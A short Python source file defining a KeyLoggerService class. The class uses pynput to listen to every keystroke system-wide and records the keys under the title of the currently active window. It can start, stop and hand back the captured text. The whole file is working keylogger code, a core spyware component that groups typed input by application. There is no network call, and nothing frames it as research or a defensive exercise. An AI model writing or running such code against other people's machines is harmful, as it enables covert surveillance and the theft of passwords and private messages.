from pynput import keyboard
import pygetwindow as gw


class KeyLoggerService:
    def __init__(self):
        self.keys = {}
        self.listener = None


    def get_active_window(self):
        try:
            return gw.getActiveWindow().title
        except:
            return "Unknown"

    def on_press(self, key):
        current_window = self.get_active_window()

        # Ensure the window title exists as a key in the dictionary
        if current_window not in self.keys:
            self.keys[current_window] = []

        try:
            char = key.char
            self.keys[current_window].append(char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.keys[current_window].append(' ')
            elif key == keyboard.Key.enter:
                self.keys[current_window].append('\n')
            elif key == keyboard.Key.tab:
                self.keys[current_window].append('\t')
            else:
                self.keys[current_window].append(f"[{key.name}]")

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self):
        keys = self.keys.copy()
        self.keys = {}
        return keys
